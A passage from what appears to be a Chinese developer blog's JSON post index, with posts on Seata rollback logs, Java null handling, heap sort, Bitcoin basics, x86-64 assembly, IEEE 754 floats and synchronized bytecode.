[rpcDispatch_RMROLE_4_8] - Branch Rollbacking: 10.116.22.63:8091:2016481020 2016481022 jdbc:mysql://localhost:3306/fescar_demo?serverTimezone=UTC INFO [rpcDispatch_RMROLE_4_8] - xid 10.116.22.63:8091:2016481020 branch 2016481022, undo_log deleted with GlobalFinished INFO [rpcDispatch_RMROLE_4_8] - Branch Rollbacked result: PhaseTwo_RollbackedDEBUG [rpcDispatch_RMROLE_4_8] - branch rollback result:xid=10.116.22.63:8091:2016481020,branchId=2016481022,branchStatus=PhaseTwo_Rollbacked,result code =Success,getMsg =null INFO [rpcDispatch_RMROLE_4_8] - RmRpcClient sendResponse xid=10.116.22.63:8091:2016481020,branchId=2016481022,branchStatus=PhaseTwo_Rollbacked,result code =Success,getMsg =nullDEBUG [rpcDispatch_RMROLE_4_8] - send response:xid=10.116.22.63:8091:2016481020,branchId=2016481022,branchStatus=PhaseTwo_Rollbacked,result code =Success,getMsg =null,channel:[id: 0xc8027ef7, L:/127.0.0.1:62873 - R:/127.0.0.1:8091] 注意： 数据库驱动与 Mysql 版本一致 数据库 rul 添加时区 jdbc.account.url=jdbc:mysql://localhost:3306/fescar_demo?serverTimezone=UTC 参考链接Seata AT 模式分布式事务源码分析 分布式事务 Seata TCC 模式深度解析","link":"/2019/07/10/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E6%A1%86%E6%9E%B6Seata/"},{"title":"关于null的思考","text":"写代码的时候有个地方需要把 Integer 类型强转为 String Integer firstEventType = eventTask.getEventType1();String firstEventTypeName = eventTypeService.queryDescByCode(String.valueOf(firstEventType)); 当我点开 String#valueof 这个静态方式时 public static String valueOf(Object obj) { return (obj == null) ? &quot;null&quot; : obj.toString();} 当我们没有获取到 firstEventType 这个值时，为 null，此时它返回给我们的是字符串 “null” ，有时候就不符合我们的业务场景，最好是提前做空值判断。 看下面一个例子 Integer i = null;System.out.println(String.valueOf(i)); // 输出 nullSystem.out.println(String.valueOf(null)); // 空指针 感觉很奇怪，竟然输出结果不一样。 看看这两个重载方法 public static String valueOf(Object obj) { return (obj == null) ? &quot;null&quot; : obj.toString();}public static String valueOf(char data[]) { return new String(data);} 凭直觉来看以为String.valueOf(null) 会选择第一做为 valueOf(Object obj) 这个从载方法，然而选择的是valueOf(char data[]) 所以会报空指针异常。 下面是查到官方文档 https://docs.oracle.com/javase/specs/jls/se7/html/jls-15.html#jls-15.12.2.5 如果第一个方法处理的任何调用都可以传递给另一个没有编译时类型错误的调用，那么一个方法比另一个方法更具体。 从意思来看 valueOf(char data[]) 比 valueOf(Object obj) 更具体。 我们非常痛恨的 null 到底是什么 Java 语言定义 There is also a special null type, the type of the expression null, which has no name. Because the null type has no name, it is impossible to declare a variable of the null type or to cast to the null type. The null reference is the only possible value of an expression of null type. The null reference can always be cast to any reference type. In practice, the programmer can ignore the null type and just pretend that null is merely a special literal that can be of any reference type.","link":"/2019/06/03/%E5%85%B3%E4%BA%8Enull%E7%9A%84%E6%80%9D%E8%80%83/"},{"title":"堆排序","text":"今天看到一篇面经，算法题是手写堆排序，《算法》放在书架已经有一段时间了，想试试能不能写出来，然而并没有，所以记录一下 自顶到底构造堆这是一道 lintcode上面的题目堆化 构造一个堆只需要从左到右遍历数组，每次只要保证所遍历到的位子能满足堆的条件 public class Solution { /* * @param A: Given an integer array * @return: nothing */ public void heapify(int[] A) { for (int i = 0; i &lt; A.length; i++) { swim(A, i); } } // 上浮 private void swim(int[] A, int i) { while(i &gt; 0 &amp;&amp; A[i] &lt; A[(i-1) / 2]) { swap(A, i, (i-1) / 2); i = (i-1) / 2; } } private void swap(int[] A, int i, int j) { int temp = A[i]; A[i] = A[j]; A[j] = temp; }} 自底到顶构造堆而堆排序采用的是自底到顶构造堆，每次把第一个元素和最后一个元素交换，交换之后把第一个元素下沉，同时堆数组减一，下面是代码 public class Heap { private static void heapSort(int[] array) { int len = array.length - 1; for (int i = (len - 1) / 2; i &gt;= 0; i--) { sink(array, i, len); } printArr(array); while (len &gt;= 0) { swap(array, 0, len); sink(array, 0, --len); } } private static void sink(int[] array, int i, int len) { while (i * 2 + 1 &lt;= len) { int j = i * 2 + 1; if (j + 1 &lt;= len &amp;&amp; array[j+1] &gt; array[j]) j++; if (array[i] &gt; array[j]) break; swap(array, i, j); i = j; } } private static void swap(int[] array, int i, int j) { int temp = array[i]; array[i] = array[j]; array[j] = temp; } public static void main(String[] args) { int[] array = {2, 3, 1, 6, 4, 5, 2, 1}; heapSort(array); printArr(array); } private static void printArr(int[] array) { Arrays.stream(array).forEach(a -&gt; System.out.print(a + &quot; &quot;)); System.out.println(); }}","link":"/2018/11/23/%E5%A0%86%E6%8E%92%E5%BA%8F/"},{"title":"比特币原理","text":"比特币是一种数字货币，是一种分散的系统，它将交易记录在称为区块链的分布式账本中。 比特币矿工运行复杂的计算机设备来解决复杂的谜题，以确认称为区块的交易组；成功后，这些区块将被添加到区块链记录中，矿工将获得少量比特币的奖励。 比特币市场的其他参与者可以通过加密货币交易所或点对点买卖代币。 比特币：数字货币比特币起源于2008年11月1日，中本聪在《白皮书》提出的一种去中心化的电子记账系统。 例如：在系统中有A、B、C和D 一共4人，A转给B账户10BTC，B转给C账户5BTC，C转给D账户2BTC， 每次转账都需要把记录广播给其他 我们会对转账记录进行打包成区块（大小为1M，大概可以存4000多条交易记录），在区块连接成链 +----------+ +----------+ +----------+ | X ---&gt; X | | A ---&gt; B | | X ---&gt; X |-- | X ---&gt; X | -- | B ---&gt; C | -- | X ---&gt; X | -- | X ---&gt; X | | C ---&gt; D | | X ---&gt; X | +----------+ +----------+ +----------+ 我们需要解决以下问题： 以谁的为准？因为我们广播的时候会有延迟，不同的人收到的交易顺序不太一样。 为什么要记账，为什么别人广播给我，我就花我自己电脑资源把帮他记账？ 如何防止伪造，A广播了一条支付B的记录，我们如何确定A真的支付给B? 其实记账是有奖励的，每次转账需要支付一点手续费的，并且打包的人有奖励，每10分钟打包一次，每次打包有50个，每经过4年打包奖励减半，我们可以算出一共有多少个BTC。 50(每10分钟) * 6(每小时6个10分钟) * 24(每天24小时) * 365 * 4(前4年) * (1 + 1/2 + 1/4 + 1/8 + ...) = 2100万个 以谁的打包为准：工作量证明，做一个很难的计算我们俗称挖矿。 挖矿原理1、哈希函数：sha256 sha256(“apple”) = 1010…..1（256位二进制） 正向算很容易，反算特别困难 2、具体原理 每个区块包含区块头和交易信息 +----------+ +----------+ +----------------+ | | | | | Block Header | |----------| | ---------| | ---------------| | X ---&gt; X | | A ---&gt; B | | |-- | X ---&gt; X | -- | B ---&gt; C | -- | Transaction | ---- | X ---&gt; X | | C ---&gt; D | | | +----------+ +----------+ +----------------+ 生成新区块的过程： 需要计算一个字符串：前块的头部+张贴信息+时间戳+随机数 对这个字符串做两次Hash计算：Hash = sha256(sha256(字符串)) 要求计算出来的结果前n为都为 0（通过改变随机数来使计算结果前n位为0）。 3、难度的确定：保证每10分钟出现一个块，通过改变 n 的大小 比如有10000台矿机，每台矿机的计算能量为 14T/s，总共计算能力为 10000 * 14T/s = 1.4 * 10^13 次/s10分钟计算的次数 = (1.4 * 10^13 次/s) * (600s) = 8 * 10^19 通过概率，我们这知道一共需要计算 2^n 次 1/2 * 1/2 * ... * 1/2 = (1/2)^n --&gt; 2^n 从而可以计算出 n = 66 2^n = 8 * 10^19 身份认证1、传统的认证方式有：人脸、签名、指纹等，在计算机系统这些都可以进行拷贝伪造。 2、电子签名 随机数 ---&gt; 私钥 ---&gt; 公钥 ---&gt; 地址 首先通过一个随机数可以得出一个私钥，私钥可以计算出公钥 私钥是保密的，公钥和地址可以公开 非对称密钥中， 一般是（对方的）公钥加密，（自己的）私钥解密，或者（自己的）私钥签名，（对方的）公钥验签名 例子：比如 A 需要付给 B 账户 10 个 BTC，具体过程如下： 对“A付给B账户10个BTC” 进行Hash（sha256）计算得到“摘要”，接着“摘要”进行私钥生成一个“签名” A进行广播，把“A付给B账户10个BTC”记录和“公钥”和“签名”这3个广播出去 其他接受到这条消息的人会对“A付给B账户10个BTC”进行Hash计算得到“摘要1”，然后用公钥验证签名到“摘要2”，然后确认这两个“摘要”是否相等。 双重支付问题1、余额检查：追溯 比如 A 需要转给 D 账号10个 BTC： 会查看以前链的所有记录，发现A获得50个，有支付20个，就知道还剩30个，够支付给D账号10个。 那么这条消息就会被网络所接受。 如果现在A 需要转给 D 账号60个 BTC，发现不余额不够，这条消广播出去就不会被接受。 +----------+ +----------+ +----------+---- | X ---&gt; X | -- | B ---&gt; A | -- | A ---&gt; C | ---- +----------+ +----------+ +----------+ A获得50BTC A支付20 2、双重支付 比如“A支付给B账号10个BTC”，同时”A支付给C账号10个BTC”。 当广播出去之后，有的人会先接受到“A支付给B账号10个BTC“这条消息，然后拒绝”A支付给C账号10个BTC”这条消息，有的人刚好相反。 然后这写人同时在打包新的区块。 +----------+ +----------+ +----------+-- | X ---&gt; X | -- | X ---&gt; Y | -- | A ---&gt; B | ---- +----------+ +----------+ +----------+ 如果刚好有人计算出新的区块的人，是接受“A支付给B账号10个BTC”这条消息，就会被打包好链接到主链上，然后发现已经有了新块了，其他人就会放弃当前块，那么”A支付给C账号10个BTC”不会被确认。 所有当有人给我们转账的时候，我们不能以为就打款成功了，需要等到这新块的形成，并且接到主链才才算成功。 防止篡改1、最长链原则 +----------+ | | +----------+ +----------+ +----------+---- | X ---&gt; X | -- | X ---&gt; Y | -- +----------+ +----------+ +----------+ | | +----------+ 当同时产生两个区块，不同的人会接到不同的广播，这个时候接到的链可能不一样。 但他们先不管，等计算到下一个区块产生时候，这个时候，此时上面的链比下面更长，广播出去之后，下面的人就会重新站队，会到上面的链。 +----------+ +----------+ | | -- | | +----------+ +----------+ +----------+ +----------+---- | X ---&gt; X | -- | X ---&gt; Y | -- +----------+ +----------+ +----------+ | | +----------+ 2、防改 如果你需要篡改某天链的信息的，你需要把 A 支付给 B 的信息，篡改为 A 支付给 C，你需要计算出一条比主链更长的篡改链才能成功，这个时候你一个人的算力要大于其它所有的算力才能篡改成功。 +----------+ +----------+ +----------+---- | X ---&gt; X | -- | A ---&gt; B | -- | X ---&gt; X | ---&gt; 原来的主链 +----------+ +----------+ +----------+ +----------+ +----------+ +----------+ | A ---&gt; C | -- | X ---&gt; X | -- | X ---&gt; X | ---&gt; 篡改链 +----------+ +----------+ +----------+ 总结1、比特币是怎么发行的 新比特币作为对矿工的奖励进入比特币网络进行流通 没生成21万个区块，奖励金额减半 从第0个区块开始的21万个区块，每生成一个区块矿工获得50比特币作为奖励 从第693万个区块开始，对矿工的奖励为0，也就是不再有新的比特币流入比特币网络， 到时，累计有2100万比特币流入到了比特币网络，矿工的收入将完全来自每笔比特币转账交易的交易费，交易费只是比特币在账户之间转移，不是新产生的比特币 2、比特币存在什么地方 比特币一般存在比特币客户端软件的数据文件里 如果把数据文件弄丢了，比如计算机硬盘坏了，就永远地失去了里面的比特币 3、比特币转账和支付宝转账有啥区别 比特币不是任何银行或金融机构发行的，使用比特币不需要绑定银行卡，不需雯任何身份证明，不需要手机短信认证。 只要能上网，只要安装了比特币客户端软件，就可以转账或收款。所有的转账不受任何机构监督和管理。较错了人，没有后悔药，完全没有挽回的余地。 4、比特币所使用的主要技术和特点： 利用SHA-256算法和非对称加密法制作数字签名 利用区块链中的区块存储比特币交易记录 设置额外的工作从而控制单位时间內生成区块的个数，同时保护比特币网络 将一定数额的比特币和区块内的所有交易费奖励给成功生成该区块的矿工，激励更多矿工加入比特币网络，促进比特币网络的茁壮成长 比特币转账不依赖银行或其他金融机构 参考 Satoshi Nakamoto：Bitcoin: A Peer-to-Peer Electronic Cash System 比特币和区块链啥原理？矿机挖矿咋回事？ 比特币的原理","link":"/2022/03/19/%E6%AF%94%E7%89%B9%E5%B8%81%E5%8E%9F%E7%90%86/"},{"title":"汇编入门","text":"从 C 语言到机器码先从一个非常简单的程序来看编译过程中发生了那些步骤。 #include &lt;stdio.h&gt;int main() { printf(&quot;hello world\\n&quot;); return 0;} 我们在 Unix 系统上终端上使用 GCC 进行编译： &gt; gcc -o hello hello.c 这里 GCC 编译器把 hello.c 源文件翻译成可执行文件 hello，这个过程一共可以分为 4 步骤： 预处理器（Pre-processor）：把头文件插入到程序文本中，得到 hello.i 文件 编译器（Compiler）：编译成汇编语言，把 hello.i 转换为 hello.s 汇编器（Assember）：将汇编语言翻译成机器语言，得到 hello.o 文件 连接器（Linker）：把 printf 函数从 print.o 以某种方式合到 hello.o程序中，得到 hello 可执行文件 当我们用高级语言编程的时候（比如 C 语言，Java 语言），编译器为我们屏蔽了很多机器级别的实现。当使用汇编写程序的时候，程序员需要指定程序来执行计算的低级指令。 高级语言提供的更高抽象级别进行工作会更加高效和可靠。编译器提供的类型检查有助于检测许多程序错误，并确保我们以一致的方式引用和操作数据。 使用现代的优化编译器，生成的代码通常至少与熟练的汇编语言程序员手动编写的代码效率相同。最重要的是，可以在许多不同的机器上编译和执行以高级语言编写的程序，而汇编代码是高度机器特定的。 既然编译器这么 智能，那我们还要学习汇编呢？ 能够阅读和理解汇编代码是一项很重要的技能 理解编译过程的优化能，分析代码中的隐含低效的代码，提高代码效率 挖掘代码中隐藏漏洞，增加安全性 汇编入门我们先写一个简单的 C 语言代码文件 mstore.c 如下： long mult2(long, long);void multstore(long x, long y, long *dest) { long t = mult2(x, y); return *dest = t;} 在命令行中使用 -S 选项可以看到 C 语言编译产生的汇编代码： &gt; gcc -Og -S mestore.c 打开 mestore.c 文件，除去一些不重要的信息，得到如下汇编代码： multstore: pushq %rbx movq %rdx, %rbx call mult2 movq %rax, (%rbx) popq %rbx ret 每一行都对对应一条机器指令，比如 pushq 指令是把寄存器中 %rbx 压入程序栈中。 如果我们使用 -c 命令行选项，GCC 会编译并汇编代码生成 mestore.o 文件 &gt; gcc -Og -c mstore.c 在 mestore.o 文件中有一段字节序列为： 53 48 89 d3 e8 00 00 00 00 48 89 03 5b c3 我们通过反汇编 mestore.o 文件 &gt; objdump -d mestore.o 结果如下，发现反汇编和前面手动编译的代码基本相似。 0000000000000000 &lt;multstore&gt;: 0: f3 0f 1e fa endbr64 4: 53 push %rbx 5: 48 89 d3 mov %rdx,%rbx 8: e8 00 00 00 00 callq d &lt;multstore+0xd&gt; d: 48 89 03 mov %rax,(%rbx) 10: 5b pop %rbx 11: c3 retq 数据格式字（word）表示 16 位数据类型，所以是双字（double words）表示 32 位数据类型，四字（quad words）表示 64 位。 C 声明 Intel 数据类型 汇编代码后缀 大小（字节） char 字节 b 1 short 字 w 2 int 双字 l 4 long 四字 q 8 char * 四字 q 8 float 单精度 s 4 double 双精度 l 8 大多数 GCC 生成的汇编代码指令都有一个字符的后缀，表明操作数的大小。例如数据传送指令有四个变种：movb （传送字节）、moww（传送字）、movl (传送双字) 和 movq (传送四字)。 注意两点： 后缀用 l 表示双字，是因为 32 位数被看成长字（long word） 4 字节整数和 8 字节双精度浮点数都用 l 后缀，并不会产生歧义，因为浮点数使用的不同指令和寄存器 访问信息 x86-64 的 CPU 包含 16 个储存 64 位通用寄存器，其中%rax 到 %rsp 比较常用，而 %r8 到 %r15 是从 32 位转了 64 位新加的。为了兼容 32 位（%eax 到 %esp）和 16 位（%ax 到 %sp）机保持兼容，对应低位表示。如：32 位只能访问低 4 位字节。 %rax 一般用作累加器（Accumulator） %rbx 一般用作基址寄存器（ Base ） %rxc 一般用来计数（ Count ） %rdx 一般用来存放数据（ Data ） %rsi一般用作源变址（ Source Index ） %rdi 一般用作目标变址（ DestinatinIndex ） %rbp 一般用作基址指针（ Base Pointer ） %rsp 一般用作堆栈指针（ Stack Pointer ） 除此之外还有： %rip 是指令指针，也称为 PC CF、ZF、SF 和 OF 条件码 下面我们通过 movq 这个指令来了解操作数的三种基本类型：立即数(Imm)、寄存器值(Reg)和内存值(Mem)。 Source Dest movq Src, Dest C Analog Imm Reg movq $0x4, %rax temp = 0x4 Imm Mem movq $-147, (%rax) *p = -147 Reg Reg movq %rax, %rdx temp2 = temp1 Reg Mem movq %rax, (%rdx) *p = temp Mem Reg movq (%rax), %rdx temp = *p 注意：是没有 movq Mem, Mem 的，不能用一条指令完成内存中的数据交换。 下面看看几种寻址的方式： 表示 计算方式 (R) Mem[Reg[R]] D(R) Mem[Reg[R] + D] D(Rb, Ri, S) Mem[Reg[Rb]+S*Reg[Ri]+D] 其中： D - 常数偏移量 Rb - 基寄存器 Ri - 索引寄存器，不能是 %rsp S - 系数 我们通过具体的例子来巩固一下，这里假设 %rdx 中的存着 0xf000，%rcx 中存着 0x0100，那么 0x8(%rdx) = 0xf000 + 0x8 = 0xf008 (%rdx, %rcx) = 0xf000 + 0x100 = 0xf100 (%rdx, %rcx, 4) = 0xf000 + 4*0x100 = 0xf400 0x80(, %rdx, 2) = 2*0xf000 + 0x80 = 0x1e080 操作指令加载有效指令 leaq Src, Dst（load effective address），其中 Src 是地址的表达式，然后把计算的值存入 Dst 指定的寄存器。指的是从内存读取数据到寄存器中，但实际上没有引用内存。类似于 C 语言的 Dst = &amp;Src。 我们通过一个例子来看： long m12(long x) { return x * 12;} 对应的汇编： leaq (%rdi, %rdi, 2), %rax # t &lt;- x+x*2salq $2, %rax # return t &lt;&lt; 2 直接对 %rdi 计算，然后赋值给 %rax 两个操作数指令： addq Src, Dest -&gt; Dest = Dest + Src subq Src, Dest -&gt; Dest = Dest - Src imulq Src, Dest -&gt; Dest = Dest * Src salq Src, Dest -&gt; Dest = Dest &lt;&lt; Src sarq Src, Dest -&gt; Dest = Dest &gt;&gt; Src （算术） shrq Src, Dest -&gt; Dest = Dest &gt;&gt; Src （逻辑） xorq Src, Dest -&gt; Dest = Dest ^ Src andq Src, Dest -&gt; Dest = Dest &amp; Src orq Src, Dest -&gt; Dest = Dest | Src 一个操作数指令： incq Dest -&gt; Dest = Dest + 1 decq Dest -&gt; Dest = Dest - 1 negq Dest -&gt; Dest = -Dest notq Dest -&gt; Dest = ~Dest 控制到目前为止，我们只考虑了顺序执行，还有一些比如：条件语句、循环和分支语句，是根据测试结果来决定执行顺序。 条件码我们用一个加法运算来说明，t = a + b ，对应的汇编为 addq Src, Dst 具体判断如下： 条件码 含义 判断 说明 CF 进位标志(Carry Flag) (unsigned) t &lt; (unsigned) a 无符号溢出 ZF 零标志(Zero Flag) t == 0 零 SF 符号标志(Sign Flag) t &lt; 0 负数 OF 溢出标志(Overflow Flag) (a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; t &lt; 0) || (a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; t &gt; 0) 有符号溢出 访问条件码条件码通过一定的组合可以得到一些判断条件： 通过一个例子来看： int gt(long x, long y) { return x &gt; y;} 对应汇编代码，%rdi 存储 x，%rsi 储存 y，%rax 表示返回值 comq %rsi, %rdi # 比较 x 和 y setg %al # 当 &gt; 设置值 movzbl %al, %eax # 将高位设置为 0 ret 跳转指令正常情况下指令是一条一条顺序执行，跳转指令（jump）会使程序切换到一个全新的位置。 通过一个例子来看： long absdiff(long x, long y) { long result; if (x &gt; y) result = x - y; else result = y - x; return result;} 没有优化，对应汇编代码，%rdi 存储 x，%rsi 储存 y，%rax 表示返回值 absdiff: cmpq %rsi, %rdi jle .L4 movq %rdi, %rax subq %rsi, %rax ret.L4: # x &lt;= y movq %rsi, %rax subq %rdi, %rax ret 我们知道 CPU 比较喜欢顺序工作，执行一系列操作会有缓存，所以效率比较高，如果遇到分支，会打破这种顺序工作，带来很大的性能影响。因此人们通常使用分支预测来解决，如果只是对这种简单的分支可以直接把两种结果直接算出来。简化为我们熟知的二元运算 test ? then_expr : else_expr 。 优化后，对应的汇编代码 absdiff: movq %rdi, %rax # x subq %rsi, %rax # result = x-y movq %rsi, %rdx subq %rdi, %rdx # eval = y-x cmpq %rsi, %rdi # x:y cmovle %rdx, %rax # if &lt;=, result = eval ret 需要注意的是，有些场景不适合： 如果两个分支比较大的计算量 如果两个计算会相互影响 循环看看 do-while 语句 long pcount_do(unsigned long x){ long result = 0; do { result += x &amp; 0x1; x &gt;&gt;= 1; } while (x); return result;} 和对应的汇编 movl $0, %eax # result = 0.L2: # loop: movq %rdi, %rdx andl $1, %edx # t = x &amp; 0x1 addq %rdx, %rax # result += t shrq %rdi # x &gt;&gt;= 1 jne .L2 # if (x) goto loop rep; ret 过程调用过程调用是一个是软件中一个很重要的抽象，提供了一种封装代码方式，在不同编程语言中有不同的形式，如：函数（function）、方法（method）、子例程（subroutine）和处理函数（handler）等。但这些都必须满足如下： 传递控制：包括如何开始执行过程代码，以及如何返回到开始的地方 传递数据：包括过程需要的参数以及过程的返回值 内存管理：如何在过程执行的时候分配内存，以及在返回之后释放内存 栈结构当 x86-64 过程调用中所需要的存储空间超过了寄存器能够存放的大小时，就会在栈上分配空间，这个空间叫作栈帧（stack fram）。栈可以用来传递参数、存储返回信息、保存寄存器和局部变量等。 重要指令： call Lable 过程调用，直接调用 push 返回地址到栈中 跳到 label ret 从过程调用中返回 pop 地址从栈中 跳到对应地址 接下来我看一个过程调用的例子： void multstore (long x, long, y, long *dest) { long t = mult2(x, y); *dest = t;}long mult2(long a, long b) { long s = a * b; return s;} 对应的汇编 0000000000400540 &lt;multstore&gt;: # x 在 %rdi 中，y 在 %rsi 中，dest 在 %rdx 中 400540: push %rbx # 通过压栈保存 %rbx 400541: mov %rdx, %rbx # 保存 dest 400544: callq 400550 &lt;mult2&gt; # 调用 mult2(x, y) # t 在 %rax 中 400549: mov %rax, (%rbx) # 结果保存到 dest 中, *dest = t 40054c: pop %rbx # 通过出栈恢复原来的 %rbx 40054d: retq # 返回0000000000400550 &lt;mult2&gt;: # a 在 %rdi 中，b 在 %rsi 中 400550: mov %rdi, %rax # 得到 a 的值 400553: imul %rsi, %rax # a * b # s 在 %rax 中 400557: retq # 返回 callq 的下一行 在 ret 之前会释放栈，比如前面通过subq $32,%rsp 分配了空间，后面就会通过 addq $32, %rsp 释放 如果参数超过了 6 个，寄存器放不下就会放到栈帧中 总结本文简单介绍 x86-64 汇编相关内容，主要介绍了一下汇编中的常用指令和使用，除了一些逆向工程师和一些底层专业人员需要比较深入了解汇编，大多数开发，并不需要写汇编语言，但是希望自己能够阅读和理解一些简单汇编代码，主要为了 Boom Lab 做准备。 参考 深入理解计算机系统 机器指令和程序优化","link":"/2020/10/20/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/"},{"title":"浮点数在计算机中的表示","text":"前言相信大家在编程过程中都有使用过浮点数，但是浮点数总是给我带来预期不一样的结果，下面展示了在 C 语言中的精度问题，发现使用浮点数总是会带来精度缺失。在学习和工作当中总能听到不能使用浮点数来表示金钱，会有精度缺失。 #include &lt;stdio.h&gt;int main() { float a = 0.1 + 0.2; printf(&quot;a = %.20f\\n&quot;, a); // 0.30000001192092895508 return 0;} 但是在一些特殊领域，单靠整数是无法满足精度要求，这个时候就需要用到浮点数。这边篇文章来解释浮点数在计算机中是如何表示。 二进制小数我们先类比一下比较熟悉的十进制数，比如 3.25 可以表示为： 3 * 10^0 + 2 * 10^-1 + 5 * 10^-2 = 3.25 如果我们只用 1 字节二进制来表示，一共 8 位，前 4 位表示整数，后 4 位表示小数，可以表示为0011 0100 ： 1 * 2^1 + 1 * 2^0 + 0 * 2^-1 + 1 * 2^-2 = 3.25 这种定点表示不能很有效的表示很大的数，我们一般在计算机中表示小数也不是使用这种方式，而是使用 IEEE 浮点表示方法。 IEEE 浮点数表示 IEEE 二进制浮点数算术标准（IEEE 754）是20世纪80运算标准，为许多CPU与浮点运算器所采用。这个标准定义了表示浮点数的格式包括负零（-0）与反常值（denormal number），一些特殊数值，比如无穷（Inf）与非数值（NaN），以及这些数值的“浮点数运算符”；它也指明了四种数值舍入规则和五种例外状况（包括例外发生的时机与处理方式） IEEE 浮点数标准用如下 V = (-1)^s * M * 2^E 形式来表示一个数： 符号（sign）：s 决定这个数是负数（s = 1）还是正数（s = 0） 尾数（significand）：M 是一个二进制小数他的范围是 [1,2) 阶码（exponent）: E 的作用是对浮点数加权，这个权重是 2 的 E 次幂，也可以为负 其中 s 对应着符号位，exp 对应着 E（注意，不一定等于 E，因为位数限制表达能力有限），frac 对应着 M（注意，不一定等于 M，因为位数限制表达能力有限）。不同的位数就代表了不同的表示能力，也就是单精度，双精度，扩展精度的来源。 给定表示，根据 exp 的值，被编码的值可以分成三种不同的情况，最后一种有两种不同的变种： 规范化值(Normalized Values) 当 exp 位不全为 0，也不全为 1，阶码的值 E = e - Bias ，其中 e 是无符号数（单精度取值范围 [1, 254] ），而 Bias 是一个等于 2^(k-1) - 1的偏置值（单精度为127）。所以 E 的取值范围为[-126, 127]。 小数字段 frac 被解释描述为 f 取值范围 [0, 1)，表示二进制小数点最高有效位。尾数定义为 M = 1 + f ，隐式表示。既然我们总能调整阶码 E，使得尾数的范围在 [1, 2) 范围中，那么这种表示方法就可以额外获取一个精度位技巧，既然第一位总是 1，那么我们就不需要显式地表现。 非规范化值(Denormalized Values) 当阶码域全为 0 时，所表示的数是非规格化形式。在这种情况下，阶码的值 E = 1 - Bias，而尾数的值 M = f 也就是小数字段，不包含隐式的开头 1。 为什么阶码的值为 1 - Bias 而不是 -Bias，这种方式提供了一种从非规格化值平滑转换的规格化值得一直手段。 非规格化有两个用途： 表示 0 ，当 f 全为 0 时，但是由于有符号位，则有 +0 和 -0 两种。 表示那些非常接近 0 的数。 特殊值 当阶码全为 1，而小数域全为 0 时，当符号位为 0 表示正无穷，当符号为 1，表示负无穷。 当小数域不全为 0 时，被称为 NaN （Not a Number），比如当计算根号一个负数，或者计算无穷减无穷。 具体表示 浮点数在坐标轴上的表示，接下来举一个实际的例子。 我们采用 1 位符号位，4 位 exp 位，3 位 frac 位，因此对应的 bias 为 7。 回顾前面公式，V = (-1)^s * M * 2^E，对于规范化数：E = exp − Bias ；对于非规范数：E = 1 − Bias。 这种形式的最小规格化同样有 E = 1 - 7 = -6 ，并且小数的取值范围也 0，1/8，…，7/8，发现最大规格化数 7/512 到最小规格化数 8/512 直接的平滑转变，这种平滑性归功于我们对非规格化数 E 的定义为 1 - Bias，而不是 -Bias，我们补偿非规格化的尾数没有隐含开头的 1。 最大规格数为 240，再增大就会溢出为正无穷。 例子求 01000011110110000000110011001101 代表的浮点数？ s exp frac1 8 230 10000111 10110000000110011001101 E = exp - Bias = 135 - 127 = 8 M = 1.10110000000110011001101 V = (-1)^s * M * 2^E = 1 * 1.10110000000110011001101 * 2^8 = 110110000.000110011001101 = 432.10000620 求 123.4 的二进制表示？ s exp frac 1 8 230 0000000 00000000000000000000除 2 乘 2123 0.4 61 1 0.8 0 30 1 0.6 1 15 0 0.2 1 7 1 0.4 0 3 1 0.8 0 1 1 0.6 1 0 1 0.2 1所以这个数为：01111011.01100110011001100110 = 01.11101101100110011001100110 * 2^6 所以 E = 6 exp = 1110 1101 1001 1001 1001 100 因为 123.4 为正数，所以 s 为 0 E = exp - Bias ，单精度 Bias 为 127，E 为 5，所以 exp = E + Bias = 6 + 127 = 133 = 1000 0101 结果为 0 10000101 11101101100110011001100 最后我们用 Java 程序来验证一下 public class BitTest { public static void main(String[] args) { printf(432.1f); printf(123.4f); } private static void printf(float f) { String s = Integer.toBinaryString(Float.floatToIntBits(f)); StringBuilder zero = new StringBuilder(); if (s.length() &lt; 32) { int len = 32 - s.length(); for (int i = 0; i &lt; len; i++) { zero.append(&quot;0&quot;); } } String binary = zero.toString() + s; System.out.println(binary.substring(0, 1) + &quot; &quot; + binary.substring(1, 9) + &quot; &quot; + binary.substring(9, 32)); }} 输出结果 0 10000111 101100000001100110011010 10000101 11101101100110011001101 发现我我们前面所计算的相同，验证我们手动计算的正确性，通过这两个例子可以加深对浮点数表示的认识。 总结本篇文章简单的介绍了 IEEE 浮点表示，介绍了规格化和非规格化的计算方式，以及如何从非规格化过度到规格化，通过通过这两个例子可以加深对浮点数表示的认识。虽然平时工作可能用不太到，但是当我看到这样设计觉得挺赞的，尤其是从非规格化到规格化的平滑过度。 参考 深入理解计算机系统 【读薄 CSAPP】壹 数据表示","link":"/2020/10/17/%E6%B5%AE%E7%82%B9%E6%95%B0%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%A4%BA/"},{"title":"深入理解Java虚拟机（四）","text":"synchronized 字节码分析我们先来看一下一个简单的方法 /** * @Author: cuzz * @Date: 2019/3/4 13:34 * @Description: */public class MyTest02 { int x = 0; public void setX(int x) { this.x = x; }} 使用 javap -v com.cuzz.jvm.bytecode.MyTest02 命令，找到 setX 方法 public void setX(int); descriptor: (I)V flags: ACC_PUBLIC Code: stack=2, locals=2, args_size=2 0: aload_0 1: iload_1 2: putfield #2 // Field x:I 5: return LineNumberTable: line 12: 0 line 13: 5 LocalVariableTable: Start Length Slot Name Signature 0 6 0 this Lcom/cuzz/jvm/bytecode/MyTest02; 0 6 1 x I 如果我们在方法中添加 synchronzied 关键字 public class MyTest02 { int x = 0; public synchronized void setX(int x) { this.x = x; }} 我们再反编译一下 public synchronized void setX(int); descriptor: (I)V flags: ACC_PUBLIC, ACC_SYNCHRONIZED Code: stack=2, locals=2, args_size=2 0: aload_0 1: iload_1 2: putfield #2 // Field x:I 5: return LineNumberTable: line 12: 0 line 13: 5 LocalVariableTable: Start Length Slot Name Signature 0 6 0 this Lcom/cuzz/jvm/bytecode/MyTest02; 0 6 1 x I 对比这两个反编译的结果，我们发现在 flags 中多了 ACC_SYNCHRONIZED，不会出现 monitorenter 和 monitorexit。 如果我们是在方法体重添加 synchronized 关键字 public class MyTest02 { String lock = &quot;lock&quot;; int x = 0; public int getX() { synchronized (lock) { return x; } }} 我们反编译一下 找到 getX 方法 public int getX(); descriptor: ()I flags: ACC_PUBLIC Code: stack=2, locals=3, args_size=1 